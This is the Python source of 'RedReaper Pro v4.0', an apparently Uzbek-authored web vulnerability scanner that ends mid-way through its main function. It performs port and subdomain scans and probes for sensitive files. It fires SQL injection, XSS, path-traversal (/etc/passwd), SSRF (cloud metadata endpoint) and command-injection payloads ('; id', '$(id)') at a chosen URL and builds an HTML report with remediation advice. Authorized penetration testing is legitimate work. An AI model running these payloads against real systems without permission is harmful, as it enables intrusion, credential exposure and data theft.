#!/usr/bin/env python3
"""
RedReaper Pro v4.0 - Enterprise Red Team Framework
Author: Red Team Project
⚠ Faqat ruxsat berilgan tizimlarda foydalaning (CTF, Bug Bounty, authorized pentest)
"""

import os, time, argparse, socket, ssl, base64, datetime, html, webbrowser, uuid
import urllib.parse
from urllib.request import Request, urlopen, URLError
from urllib.parse import urlparse
from typing import List, Dict
from dataclasses import dataclass, field
from enum import Enum

# ========================[ COLORS ]========================
class Colors:
    RESET = '\033[0m'; BOLD = '\033[1m'; DIM = '\033[2m'
    RED = '\033[31m'; GREEN = '\033[32m'; YELLOW = '\033[33m'
    CYAN = '\033[36m'; WHITE = '\033[37m'; MAGENTA = '\033[35m'
    BRIGHT_RED = '\033[91m'; BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'; BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'; BRIGHT_MAGENTA = '\033[95m'

# ========================[ LOGGER ]========================
class Logger:
    def __init__(self, verbose=False): self.verbose = verbose
    def info(self, msg):    print(f"  {Colors.CYAN}->{Colors.RESET} {msg}")
    def warning(self, msg): print(f"  {Colors.YELLOW}!!{Colors.RESET} {msg}")
    def error(self, msg):   print(f"  {Colors.RED}XX{Colors.RESET} {msg}")
    def success(self, msg): print(f"  {Colors.GREEN}OK{Colors.RESET} {msg}")
    def critical(self, msg):print(f"  {Colors.RED}{Colors.BOLD}## {msg}{Colors.RESET}")
    def debug(self, msg):
        if self.verbose: print(f"  {Colors.DIM}.. {msg}{Colors.RESET}")

# ========================[ MODELS ]========================
class Severity(Enum):
    INFO = 0; LOW = 1; MEDIUM = 2; HIGH = 3; CRITICAL = 4

@dataclass
class Vulnerability:
    vuln_id:     str      = ""
    type:        str      = ""
    severity:    Severity = Severity.MEDIUM
    url:         str      = ""
    parameter:   str      = ""
    payload:     str      = ""
    description: str      = ""
    remediation: str      = ""
    cvss_score:  float    = 0
    evidence:    str      = ""
    curl_command:str      = ""
    cve_id:      str      = ""
    cwe_id:      str      = ""
    def __post_init__(self):
        if not self.vuln_id:
            self.vuln_id = f"RR-{uuid.uuid4().hex[:8].upper()}"

@dataclass
class Target:
    url:             str            = ""
    domain:          str            = ""
    ip:              str            = ""
    hostname:        str            = ""
    ports:           List[int]      = field(default_factory=list)
    services:        Dict[int, str] = field(default_factory=dict)
    subdomains:      List[str]      = field(default_factory=list)
    technologies:    List[str]      = field(default_factory=list)
    endpoints:       List[str]      = field(default_factory=list)
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    status:          str            = "pending"

    def __post_init__(self):
        if self.url:
            parsed = urlparse(self.url)
            self.domain   = parsed.netloc or parsed.path
            self.hostname = self.domain.split(':')[0]
            if not self.ip:
                try:    self.ip = socket.gethostbyname(self.hostname)
                except: self.ip = self.hostname

# ========================[ HTTP CLIENT ]========================
class HTTPClient:
    def __init__(self, timeout=10):
        self.timeout = timeout

    def get(self, url, headers=None, params=None):
        if params:
            url += '?' + urllib.parse.urlencode(params)
        if headers is None:
            headers = {}
        if 'User-Agent' not in headers:
            headers['User-Agent'] = (
                'Mozilla/5.0 (X11; Linux x86_64) '
                'AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
            )
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            req  = Request(url, headers=headers)
            resp = urlopen(req, timeout=self.timeout, context=ctx)
            return {
                'status' : resp.status,
                'headers': dict(resp.headers),
                'body'   : resp.read().decode('utf-8', errors='ignore'),
            }
        except URLError as e:
            return {
                'status' : getattr(e, 'code', 0),
                'body'   : str(e.reason) if hasattr(e, 'reason') else '',
                'headers': {},
            }
        except:
            return {'status': 0, 'body': '', 'headers': {}}

# ========================[ SCANNER ]========================
COMMON_PORTS = [
    21,22,23,25,53,80,110,111,135,139,143,389,443,445,
    465,587,636,993,995,1433,1521,2049,3306,3389,5432,
    5900,5985,5986,6379,8080,8443,27017
]

COMMON_SUBDOMAINS = [
    'www','mail','remote','blog','webmail','server','ns1','ns2','smtp',
    'secure','vpn','admin','cpanel','whm','test','dev','api','app',
    'portal','shop','ftp','ssh','git','jenkins','jira','wiki','help',
    'support','m','mobile','static','cdn','img','assets','download',
    'cloud','autodiscover','email','host','mx','dns','cms','backup',
    'beta','stage','staging','demo','forum','community','status',
    'metrics','dashboard','panel','manager','gitlab','monitor','docs',
    'chat','login','auth','sso','redirect','proxy','gateway','graphql',
    'rest','soap','sandbox','internal','corp','partner','careers',
    'jobs','reports','analytics',
]

SENSITIVE_PATHS = [
    'admin','login','wp-admin','.git/config','.env','robots.txt',
    'sitemap.xml','api/','backup/','config/','phpinfo.php','info.php',
    'wp-content/','wp-json/','server-status','actuator/health',
    'actuator/env','swagger-ui.html','graphql','crossdomain.xml',
    'shell.php','cmd.php','uploads/','test.php','debug.log',
    'error.log','index.php.bak','wp-config.php.bak','.aws/',
    'Dockerfile','docker-compose.yml','Jenkinsfile','security.txt',
    '.htaccess','web.config','default.aspx','admin.aspx',
    'WEB-INF/web.xml','console','/actuator/',
]

class Scanner:
    def __init__(self, target, logger, args):
        self.target = target
        self.log    = logger
        self.args   = args
        self.http   = HTTPClient(timeout=args.timeout)

    # ── Payloadlar ─────────────────────────────────────────────
    def sql_payloads(self):
        return [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",
            "' AND SLEEP(3)--",
            "1' AND 1=1--",
            "' OR 1=1--",
            "1' AND 1=2 UNION SELECT 1,2,3--",
            "'; WAITFOR DELAY '0:0:3'--",
            "' UNION SELECT @@version,user(),database()--",
        ]

    def xss_payloads(self):
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
        ]

    def lfi_payloads(self):
        return [
            '../../../../etc/passwd',
            '../../../../windows/win.ini',
            'php://filter/convert.base64-encode/resource=index.php',
            'file:///etc/passwd',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
        ]

    def ssrf_payloads(self):
        return [
            'http://127.0.0.1:22',
            'http://127.0.0.1:80',
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd',
            'http://localhost:8080',
            'dict://127.0.0.1:6379/info',
        ]

    def cmd_payloads(self):
        return ['; id', '| id', '`id`', '$(id)', '; whoami', '| whoami', '&& whoami']

    # ── Ana skan ───────────────────────────────────────────────
    def scan_all(self):
        print(f"\n{Colors.BRIGHT_CYAN}=== Scanning {self.target.url} ==={Colors.RESET}\n")

        if self.args.port_scan:      self._port_scan()
        if self.args.subdomain:      self._subdomain_enum()
        if self.args.url_discovery:  self._url_discovery()
        if self.args.sqli:           self._sqli()
        if self.args.xss:            self._xss()
        if self.args.lfi:            self._lfi()
        if self.args.ssrf:           self._ssrf()
        if self.args.cmd_injection:  self._cmd_injection()
        if self.args.open_redirect:  self._open_redirect()
        if self.args.cve:            self._cve_patterns()

        return self._print_summary()

    # ── Faza 1: Port skan ──────────────────────────────────────
    def _port_scan(self):
        self.log.info("Port scanning...")
        for port in COMMON_PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                if s.connect_ex((self.target.ip, port)) == 0:
                    try:    svc = socket.getservbyport(port)
                    except: svc = 'unknown'
                    self.target.ports.append(port)
                    self.target.services[port] = svc
                    self.log.success(f"Port {port}/tcp open — {svc}")
                s.close()
            except:
                pass
        if not self.target.ports:
            self.log.info("Ochiq port topilmadi")

    # ── Faza 2: Subdomain ──────────────────────────────────────
    def _subdomain_enum(self):
        self.log.info("Subdomain enumeration...")
        for sub in COMMON_SUBDOMAINS:
            try:
                sd = f"{sub}.{self.target.hostname}"
                ip = socket.gethostbyname(sd)
                self.target.subdomains.append(sd)
                self.log.success(f"Topildi: {sd} ({ip})")
            except:
                pass
        if not self.target.subdomains:
            self.log.info("Subdomain topilmadi")

    # ── Faza 3: URL Discovery ──────────────────────────────────
    def _baseline(self, base):
        """Mavjud bo'lmagan tasodifiy yo'lga javob — false-positive filtri uchun."""
        rnd = self.http.get(f"{base}/{uuid.uuid4().hex}")
        return rnd['status'], len(rnd['body'] or '')

    def _looks_like_catchall(self, resp, base_status, base_len):
        """Server bu yo'lga ham baseline bilan bir xil javob berdimi?"""
        return (resp['status'] == base_status and
                abs(len(resp['body'] or '') - base_len) < 64)

    def _url_discovery(self):
        self.log.info("URL / path discovery...")
        parsed = urlparse(self.target.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        base_status, base_len = self._baseline(base)
        for path in SENSITIVE_PATHS:
            url  = f"{base}/{path}"
            resp = self.http.get(url)
            if not resp['status'] or resp['status'] in (0, 404):
                continue
            if self._looks_like_catchall(resp, base_status, base_len):
                continue
            self.target.endpoints.append(path)
            self.log.success(f"Topildi: /{path}  [{resp['status']}]")

    # ── Faza 4: SQL Injection ──────────────────────────────────
    def _sqli(self):
        self.log.info("SQL Injection scanning...")
        parsed = urlparse(self.target.url)
        params = (urllib.parse.parse_qs(parsed.query)
                  if parsed.query else {'id': ['1'], 'q': ['test']})
        sql_errors = [
            'sql','mysql','sqlite','postgresql','oracle',
            'syntax error','unclosed quotation','odbc','driver',
            'warning: mysql',
        ]
        for param in params:
            for payload in self.sql_payloads()[:5]:
                tp = params.copy(); tp[param] = [payload]
                test_url = (self.target.url.split('?')[0] + '?' +
                            urllib.parse.urlencode(tp, doseq=True))
                t0   = time.time()
                resp = self.http.get(test_url)
                ela  = time.time() - t0
                body = resp['body'].lower()

                for err in sql_errors:
                    if err in body:
                        self._add_vuln(
                            "SQL Injection (Error-Based)", Severity.CRITICAL,
                            test_url, param, payload, 9.8,
                            f"DB error keyword: '{err}'", "CWE-89",
                            "Prepared statement / parameterized query ishlating."
                        )
                        break

                if 'sleep' in payload.lower() and ela > 2.5:
                    self._add_vuln(
                        "SQL Injection (Time-Based Blind)", Severity.HIGH,
                        test_url, param, payload, 8.6,
                        f"Response time: {ela:.2f}s", "CWE-89",
                        "Prepared statement ishlating."
                    )

    # ── Faza 5: XSS ───────────────────────────────────────────
    def _xss(self):
        self.log.info("XSS scanning...")
        parsed = urlparse(self.target.url)
        params = (urllib.parse.parse_qs(parsed.query)
                  if parsed.query else {'q': [''], 'search': ['']})
        for param in params:
            for payload in self.xss_payloads():
                tp = params.copy(); tp[param] = [payload]
                test_url = (self.target.url.split('?')[0] + '?' +
                            urllib.parse.urlencode(tp, doseq=True))
                resp = self.http.get(test_url)
                if resp['body'] and payload in resp['body']:
                    if html.escape(payload) not in resp['body']:
                        self._add_vuln(
                            "XSS (Reflected)", Severity.HIGH,
                            test_url, param, payload, 7.2,
                            "Payload raw holda aks etdi", "CWE-79",
                            "Output encoding (context-aware) qo'llang."
                        )
                        break

    # ── Faza 6: LFI ───────────────────────────────────────────
    def _lfi(self):
        self.log.info("LFI / Path Traversal scanning...")
        parsed = urlparse(self.target.url)
        params = (urllib.parse.parse_qs(parsed.query)
                  if parsed.query else {'file': [''], 'page': ['']})
        for param in params:
            for payload in self.lfi_payloads():
                tp = params.copy(); tp[param] = [payload]
                test_url = (self.target.url.split('?')[0] + '?' +
                            urllib.parse.urlencode(tp, doseq=True))
                resp = self.http.get(test_url)
                body = resp['body']
                if 'root:x:' in body or '[fonts]' in body:
                    self._add_vuln(
                        "LFI (Local File Inclusion)", Severity.CRITICAL,
                        test_url, param, payload, 9.1,
                        "Fayl mazmuni response'da topildi", "CWE-22",
                        "Foydalanuvchi inputini fayl yo'lida ishlatmang."
                    )
                    break
                if 'php://' in payload:
                    try:
                        base64.b64decode(body[:200].strip())
                        self._add_vuln(
                            "LFI via PHP Wrapper", Severity.CRITICAL,
                            test_url, param, payload, 8.8,
                            "Base64 encoded PHP source topildi", "CWE-22",
                            "PHP wrapperlarni o'chiring."
                        )
                        break
                    except:
                        pass

    # ── Faza 7: SSRF ──────────────────────────────────────────
    def _ssrf(self):
        self.log.info("SSRF scanning...")
        parsed = urlparse(self.target.url)
        params = (urllib.parse.parse_qs(parsed.query)
                  if parsed.query else {'url': [''], 'src': ['']})
        ssrf_indicators = ['ec2','ami-id','meta-data','iam','computemetadata','droplet']
        for param in params:
            for payload in self.ssrf_payloads():
                tp = params.copy(); tp[param] = [payload]
                test_url = (self.target.url.split('?')[0] + '?' +
                            urllib.parse.urlencode(tp, doseq=True))
                resp = self.http.get(test_url)
                body = resp['body'].lower()
                if any(ind in body for ind in ssrf_indicators):
                    self._add_vuln(
                        "SSRF (Server-Side Request Forgery)", Severity.HIGH,
                        test_url, param, payload, 8.2,
                        "Cloud metadata so'rovga javob berdi", "CWE-918",
                        "URL'larni whitelist bilan cheklang."
                    )
                    break

    # ── Faza 8: Command Injection ─────────────────────────────
    def _cmd_injection(self):
        self.log.info("Command Injection scanning...")
        parsed = urlparse(self.target.url)
        params = (urllib.parse.parse_qs(parsed.query)
                  if parsed.query else {'cmd': [''], 'exec': ['']})
        for param in params:
            for payload in self.cmd_payloads():
                tp = params.copy(); tp[param] = [payload]
                test_url = (self.target.url.split('?')[0] + '?' +
                            urllib.parse.urlencode(tp, doseq=True))
                resp = self.http.get(test_url)
                body = resp['body'].lower()
                if any(x in body for x in ['uid=','gid=','www-data','root:']):
                    self._add_vuln(
                        "Command Injection (RCE)", Severity.CRITICAL,
                        test_url, param, payload, 9.8,
                        "Tizim komandasi natijasi response'da", "CWE-78",
                        "User inputni hech qachon system callda ishlatmang."
                    )
                    break

    # ── Faza 9: Open Redirect ─────────────────────────────────
    def _open_redirect(self):
        self.log.info("Open Redirect scanning...")
        redir_params = {'url','redirect','redirect_uri','return','next',
                        'dest','destination','go','back','continue'}
        parsed = urlparse(self.target.url)
        if not parsed.query:
            return
        params = urllib.parse.parse_qs(parsed.query)
        for param in params:
            if param.lower() not in redir_params:
                continue
            for payload in ['https://evil.com', '//evil.com']:
                tp = params.copy(); tp[param] = [payload]
                test_url = (self.target.url.split('?')[0] + '?' +
                            urllib.parse.urlencode(tp, doseq=True))
                resp = self.http.get(test_url)
                loc  = (resp['headers'].get('Location','') or
                        resp['headers'].get('location',''))
                if 'evil.com' in loc:
                    self._add_vuln(
                        "Open Redirect", Severity.MEDIUM,
                        test_url, param, payload, 5.4,
                        f"Redirect manzili: {loc}", "CWE-601",
                        "Redirect URL'larni whitelist bilan tekshiring."
                    )
                    break

    # ── Faza 10: CVE Patterns ─────────────────────────────────
    def _cve_patterns(self):
        self.log.info("CVE / sensitive path checking...")
        checks = [
            ('/.env',             'Env File Exposure',        'CRITICAL'),
            ('/.git/config',      'Git Config Exposure',      'CRITICAL'),
            ('/actuator/env',     'Spring Boot Actuator Env', 'HIGH'),
            ('/actuator/health',  'Spring Boot Health',       'LOW'),
            ('/console',          'H2 Console Open',          'HIGH'),
            ('/phpinfo.php',      'PHP Info Exposure',        'HIGH'),
            ('/WEB-INF/web.xml',  'Java web.xml Exposed',     'HIGH'),
            ('/swagger-ui.html',  'Swagger UI Public',        'MEDIUM'),
            ('/server-status',    'Apache Server-Status',     'MEDIUM'),
            ('/wp-json/wp/v2/users','WordPress User Enum',    'MEDIUM'),
            ('/graphql',          'GraphQL Endpoint',         'INFO'),
            ('/robots.txt',       'Robots.txt',               'INFO'),
            ('/sitemap.xml',      'Sitemap Exposure',         'INFO'),
            ('/security.txt',     'Security Contact',         'INFO'),
            ('/crossdomain.xml',  'Crossdomain Policy',       'LOW'),
        ]
        sev_map = {
            'CRITICAL': Severity.CRITICAL, 'HIGH': Severity.HIGH,
            'MEDIUM':   Severity.MEDIUM,   'LOW':  Severity.LOW,
            'INFO':     Severity.INFO,
        }
        cvss_map = {
            'CRITICAL': 9.1, 'HIGH': 7.5, 'MEDIUM': 5.0,
            'LOW': 3.0, 'INFO': 0.0,
        }
        parsed = urlparse(self.target.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        base_status, base_len = self._baseline(base)
        for path, name, level in checks:
            test_url = base + path
            resp     = self.http.get(test_url)
            if not resp['status'] or resp['status'] in (0, 404):
                continue
            if self._looks_like_catchall(resp, base_status, base_len):
                continue
            sev = sev_map[level]
            self._add_vuln(
                    f"Sensitive Path: {name}", sev,
                    test_url, "", "", cvss_map[level],
                    f"HTTP {resp['status']} — {path} accessible", "CWE-200",
                    "Sensitive path'larga kirishni cheklang / o'chiring."
                )

    # ── Helper ─────────────────────────────────────────────────
    def _add_vuln(self, vtype, severity, url, param, payload,
                  cvss, evidence, cwe, remediation):
        # Duplicate tekshirish
        for existing in self.target.vulnerabilities:
            if existing.type == vtype and existing.url == url and existing.parameter == param:
                return
        v = Vulnerability(
            type=vtype, severity=severity, url=url,
            parameter=param, payload=payload, cvss_score=cvss,
            evidence=evidence, cwe_id=cwe, remediation=remediation,
        )
        self.target.vulnerabilities.append(v)
        sev_colors = {
            Severity.CRITICAL: Colors.RED,
            Severity.HIGH:     Colors.BRIGHT_RED,
            Severity.MEDIUM:   Colors.YELLOW,
            Severity.LOW:      Colors.CYAN,
            Severity.INFO:     Colors.DIM,
        }
        c = sev_colors.get(severity, Colors.WHITE)
        print(f"  {c}[{severity.name}]{Colors.RESET} {vtype}"
              + (f" — param: {param}" if param else ""))

    def _print_summary(self):
        vulns = self.target.vulnerabilities
        crit  = sum(1 for v in vulns if v.severity == Severity.CRITICAL)
        high  = sum(1 for v in vulns if v.severity == Severity.HIGH)
        med   = sum(1 for v in vulns if v.severity == Severity.MEDIUM)

        print(f"\n{Colors.BRIGHT_CYAN}{'='*55}{Colors.RESET}")
        print(f"{Colors.BRIGHT_GREEN} SCAN COMPLETE{Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}{'='*55}{Colors.RESET}")
        print(f"  Jami zaifliklar : {len(vulns)}")
        if crit: print(f"  {Colors.RED}Critical : {crit}{Colors.RESET}")
        if high: print(f"  {Colors.BRIGHT_RED}High     : {high}{Colors.RESET}")
        if med:  print(f"  {Colors.YELLOW}Medium   : {med}{Colors.RESET}")
        print(f"  Ochiq portlar   : {len(self.target.ports)}")
        print(f"  Subdomainlar    : {len(self.target.subdomains)}")
        print(f"  Endpointlar     : {len(self.target.endpoints)}")

        if vulns:
            print(f"\n{Colors.BRIGHT_CYAN}=== Batafsil ==={Colors.RESET}")
            order = {Severity.CRITICAL:0, Severity.HIGH:1, Severity.MEDIUM:2,
                     Severity.LOW:3, Severity.INFO:4}
            for i, v in enumerate(sorted(vulns, key=lambda x: order.get(x.severity, 5)), 1):
                c = (Colors.RED if v.severity == Severity.CRITICAL else
                     Colors.BRIGHT_RED if v.severity == Severity.HIGH else
                     Colors.YELLOW)
                print(f"\n{c}[{i}] {v.type} ({v.severity.name})  CVSS: {v.cvss_score}{Colors.RESET}")
                print(f"     URL   : {Colors.CYAN}{v.url}{Colors.RESET}")
                if v.parameter: print(f"     Param : {v.parameter}")
                if v.payload:   print(f"     Payload: {Colors.YELLOW}{v.payload[:60]}{Colors.RESET}")
                if v.evidence:  print(f"     Dalil : {v.evidence}")
                if v.cwe_id:    print(f"     CWE   : {v.cwe_id}")
                if v.remediation: print(f"     Fix   : {Colors.GREEN}{v.remediation}{Colors.RESET}")

        return {'vulnerabilities': len(vulns), 'critical': crit,
                'high': high, 'medium': med}


# ========================[ REPORT GENERATOR ]========================
class ReportGenerator:
    @staticmethod
    def generate_html(target, scan_results):
        vulns = target.vulnerabilities
        crit  = sum(1 for v in vulns if v.severity == Severity.CRITICAL)
        high  = sum(1 for v in vulns if v.severity == Severity.HIGH)
        med   = sum(1 for v in vulns if v.severity == Severity.MEDIUM)
        total = len(vulns)

        risk_class = ("risk-critical" if crit  else "risk-high" if high else
                      "risk-medium"   if med   else "risk-low")
        risk_label = ("CRITICAL" if crit else "HIGH" if high else
                      "MEDIUM"   if med  else "LOW")

        ports_html = "".join(
            f"<tr><td>{p}/tcp</td><td>{target.services.get(p,'unknown')}</td></tr>"
            for p in sorted(target.ports)
        )
        subs_html = "".join(
            f"<tr><td><code>{s}</code></td></tr>"
            for s in target.subdomains[:30]
        )
        endpoints_html = "".join(
            f"<tr><td><code>/{e}</code></td></tr>"
            for e in target.endpoints[:30]
        )

        order = {Severity.CRITICAL:0, Severity.HIGH:1, Severity.MEDIUM:2,
                 Severity.LOW:3, Severity.INFO:4}
        vulns_html = ""
        for v in sorted(vulns, key=lambda x: order.get(x.severity, 5)):
            cls = v.severity.name.lower()
            param_h = (f'<div class="detail"><label>Parameter</label>'
                       f'<span><code>{v.parameter}</code></span></div>') if v.parameter else ''
            payload_h = (f'<div class="detail"><label>Payload</label>'
                         f'<pre>{html.escape(v.payload)}</pre></div>') if v.payload else ''
            evidence_h = (f'<div class="detail"><label>Evidence</label>'
                          f'<span>{v.evidence}</span></div>') if v.evidence else ''
            cwe_num = v.cwe_id.split("-")[1] if "-" in v.cwe_id else ""
            cwe_h = (f'<div class="detail"><label>CWE</label>'
                     f'<span><a href="https://cwe.mitre.org/data/definitions/{cwe_num}.html"'
                     f' style="color:#ffaa00;">{v.cwe_id}</a></span></div>') if v.cwe_id else ''
            fix_h = (f'<div class="detail"><label>Remediation</label>'
                     f'<span style="color:#00cc00;">{v.remediation}</span></div>') if v.remediation else ''
            vulns_html += f'''
<div class="vuln-card {cls}">
  <h3>{v.type}</h3>
  <div class="detail"><label>Severity</label>
    <span>{v.severity.name} &nbsp;|&nbsp; CVSS: {v.cvss_score}</span></div>
  <div class="detail"><label>URL</label>
    <span><a href="{v.url}" style="color:#e94560;">{v.url}</a></span></div>
  {param_h}{payload_h}{evidence_h}{cwe_h}{fix_h}
</div>'''

        return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>RedReaper Pro — {target.domain}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0a0a0f,#1a1a2e);color:#e0e0e0;min-height:100vh}}
.container{{max-width:1100px;margin:0 auto;padding:30px}}
.header{{background:linear-gradient(135deg,#1a1a2e,#16213e);border:1px solid #e94560;border-radius:15px;padding:30px;margin-bottom:25px}}
.header h1{{color:#e94560;font-size:2.2em}}
.header .sub{{color:#888;margin-top:6px}}
.meta{{display:flex;gap:16px;margin-top:14px;flex-wrap:wrap}}
.meta-item{{background:rgba(233,69,96,.1);padding:8px 15px;border-radius:8px;border:1px solid rgba(233,69,96,.3)}}
.meta-item label{{color:#888;font-size:.82em;display:block}}
.meta-item span{{color:#fff;font-weight:600}}
.stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;margin:20px 0}}
.stat{{background:#1a1a2e;border:1px solid #333;border-radius:12px;padding:18px;text-align:center}}
.stat .num{{font-size:2.5em;font-weight:800}}
.stat .lbl{{color:#888;font-size:.82em;margin-top:4px}}
.s-crit .num{{color:#ff0000}} .s-high .num{{color:#ff4444}}
.s-med .num{{color:#ffaa00}}  .s-tot .num{{color:#e94560}}
.section{{background:#1a1a2e;border:1px solid #333;border-radius:14px;padding:24px;margin-bottom:22px}}
.section h2{{color:#e94560;border-bottom:2px solid #333;padding-bottom:10px;margin-bottom:18px}}
.vuln-card{{background:linear-gradient(135deg,#1a1a2e,#1e1e3e);border:1px solid #333;border-radius:12px;padding:18px;margin-bottom:14px;border-left:5px solid #555}}
.vuln-card.critical{{border-left-color:#ff0000}} .vuln-card.high{{border-left-color:#ff4444}}
.vuln-card.medium{{border-left-color:#ffaa00}}   .vuln-card.low{{border-left-color:#00cc00}}
.vuln-card h3{{color:#e94560;margin-bottom:10px}}
.detail{{margin:5px 0}} .detail label{{color:#888;font-size:.82em;display:block}}
.detail span{{color:#fff;word-break:break-all}}
code{{background:#0a0a0f;padding:2px 6px;border-radius:4px;color:#00ff00;font-family:'Courier New',monospace;font-size:.9em}}
pre{{background:#0a0a0f;border:1px solid #333;border-radius:8px;padding:14px;overflow-x:auto;margin:8px 0;color:#00ff00;font-family:'Courier New',monospace}}
table{{width:100%;border-collapse:collapse;margin:12px 0}}
th{{background:#1a1a2e;color:#e94560;padding:11px;text-align:left;border-bottom:2px solid #e94560}}
td{{padding:9px 11px;border-bottom:1px solid #333}}
tr:hover td{{background:rgba(233,69,96,.05)}}
.risk-badge{{display:inline-block;padding:10px 25px;border-radius:25px;font-weight:800;font-size:1.2em;margin:14px 0}}
.risk-critical{{background:#ff0000;color:#fff;box-shadow:0 0 20px rgba(255,0,0,.5)}}
.risk-high{{background:#ff4444;color:#fff}}
.risk-medium{{background:#ffaa00;color:#000}}
.risk-low{{background:#00cc00;color:#000}}
.footer{{text-align:center;padding:28px;color:#555;border-top:1px solid #333;margin-top:28px}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>🩸 RedReaper Pro v4.0</h1>
    <div class="sub">Enterprise Penetration Test Report — {target.domain}</div>
    <div class="meta">
      <div class="meta-item"><label>Target</label><span>{target.url}</span></div>
      <div class="meta-item"><label>IP</label><span>{target.ip}</span></div>
      <div class="meta-item"><label>Date</label><span>{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}</span></div>
    </div>
  </div>

  <div class="section">
    <h2>📋 Executive Summary</h2>
    <div class="risk-badge {risk_class}">{risk_label}</div>
    <div class="stats">
      <div class="stat s-tot"><div class="num">{total}</div><div class="lbl">Total</div></div>
      <div class="stat s-crit"><div class="num">{crit}</div><div class="lbl">Critical</div></div>
      <div class="stat s-high"><div class="num">{high}</div><div class="lbl">High</div></div>
      <div class="stat s-med"><div class="num">{med}</div><div class="lbl">Medium</div></div>
    </div>
  </div>

  <div class="section">
    <h2>🔍 Reconnaissance</h2>
    {"<h3>Open Ports</h3><table><tr><th>Port</th><th>Service</th></tr>" + ports_html + "</table>" if ports_html else "<p style='color:#666'>Port scan o'tkazilmadi</p>"}
    {"<h3>Subdomains</h3><table><tr><th>Subdomain</th></tr>" + subs_html + "</table>" if subs_html else ""}
    {"<h3>Sensitive Paths</h3><table><tr><th>Path</th></tr>" + endpoints_html + "</table>" if endpoints_html else ""}
  </div>

  {"<div class='section'><h2>⚠ Vulnerabilities</h2>" + vulns_html + "</div>" if vulns_html else ""}

  <div class="section">
    <h2>🛡 Recommendations</h2>
    <ol style="padding-left:20px;line-height:2">
      <li><strong>Input Validation</strong> — Strict server-side validation for all user inputs</li>
      <li><strong>Parameterized Queries</strong> — Prevent SQL injection at the database layer</li>
      <li><strong>Output Encoding</strong> — Context-aware encoding to prevent XSS</li>
      <li><strong>Access Controls</strong> — Review and harden authentication mechanisms</li>
      <li><strong>Security Headers</strong> — CSP, HSTS, X-Frame-Options, Referrer-Policy</li>
      <li><strong>Sensitive Files</strong> — Block public access to .env, .git, config files</li>
      <li><strong>Regular Updates</strong> — Patch all frameworks and dependencies</li>
    </ol>
  </div>

  <div class="footer">
    <p>Generated by <span style="color:#e94560;font-weight:700">RedReaper Pro v4.0</span></p>
    <p style="color:#333;margin-top:8px;font-size:.85em">⚠ Authorized Security Assessment Only</p>
  </div>
</div>
</body>
</html>'''

    @staticmethod
    def save_report(html_content, filename=None):
        if not filename:
            filename = f"RedReaper_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        print(f"\n{Colors.GREEN}OK{Colors.RESET} Hisobot saqlandi: "
              f"{Colors.BRIGHT_YELLOW}{filename}{Colors.RESET}")
        return filename


# ========================[ BANNER ]========================
BANNER = f'''{Colors.RED}{Colors.BOLD}
  ____          _ ____
 |  _ \\ ___  __| |  _ \\ ___  __ _ _ __   ___ _ __
 | |_) / _ \\/ _` | |_) / _ \\/ _` | '_ \\ / _ \\ '__|
 |  _ <  __/ (_| |  _ <  __/ (_| | |_) |  __/ |
 |_| \\_\\___|\\__,_|_| \\_\\___|\\__,_| .__/ \\___|_|
                                   |_|
{Colors.BRIGHT_CYAN}   RedReaper Pro v4.0 — Enterprise Red Team Framework{Colors.RESET}
{Colors.DIM}   ⚠  Faqat ruxsat berilgan tizimlarda foydalaning  ⚠{Colors.RESET}
'''


# ========================[ MAIN ]========================
def main():
    parser = argparse.ArgumentParser(
        description='RedReaper Pro v4.0 — Enterprise Red Team Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 redreaper.py -u https://target.com --full
  python3 redreaper.py -u https://target.com --sqli --xss --cve -v
  python3 redreaper.py -u "https://target.com/?id=1" --sqli --lfi
        '''
    )

    parser.add_argument('-u','--url',          help='Target URL')
    parser.add_argument('--full',              action='store_true', help='Barcha modullar + HTML hisobot')
    parser.add_argument('--all',               action='store_true', help='Barcha modullar')
    parser.add_argument('--port-scan',         action='store_true', help='Port skan')
    parser.add_argument('--subdomain',         action='store_true', help='Subdomain enum')
    parser.add_argument('--url-discovery',     action='store_true', help='Sensitive path discovery')
    parser.add_argument('--sqli',              action='store_true', help='SQL Injection')
    parser.add_argument('--xss',               action='store_true', help='XSS')
    parser.add_argument('--lfi',               action='store_true', help='LFI / Path Traversal')
    parser.add_argument('--ssrf',              action='store_true', help='SSRF')
    parser.add_argument('--cmd-injection',     action='store_true', help='Command Injection')
    parser.add_argument('--open-redirect',     action='store_true', help='Open Redirect')
    parser.add_argument('--cve',               action='store_true', help='CVE / sensitive path')
    parser.add_argument('-o','--output',       help='HTML hisobot fayli nomi')
    parser.add_argument('-t','--threads',      type=int, default=30)
    parser.add_argument('--timeout',           type=int, default=8)
    parser.add_argument('-v','--verbose',      action='store_true')

    args = parser.parse_args()

    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)

    if not args.url:
        parser.print_help()
        return

    if args.all or args.full:
